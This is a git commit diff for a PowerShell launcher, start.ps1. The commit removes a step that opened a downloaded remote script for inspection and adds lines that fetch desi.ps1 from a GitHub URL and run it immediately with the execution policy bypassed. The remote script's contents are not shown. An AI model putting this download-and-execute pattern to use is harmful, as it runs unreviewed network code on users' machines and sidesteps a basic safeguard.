37dd565b45656d6476388b13fe0067774d0165ab
Sky <stormdiscordsoon@gmail.com>
2025-10-28 02:46:05 +0100

    Update script to save and execute locally

--- start.ps1
+++ start.ps1
@@ -1,8 +1,2 @@
-# Télécharge le script
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/stormdiscordsoon-ship-it/dcder/main/des./desi.ps1" -OutFile "$env:TEMP\desi.ps1"
-
-# Vérifie le contenu avant de l’exécuter :
-notepad "$env:TEMP\desi.ps1"
-
-# (Optionnel) Exécute le script si tu es sûr qu’il est sûr
-powershell -ExecutionPolicy Bypass -File "$env:TEMP\desi.ps1"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/stormdiscordsoon-ship-it/dcder/main/des./desi.ps1" -OutFile "desi.ps1"
+powershell -ExecutionPolicy Bypass -File .\desi.ps1
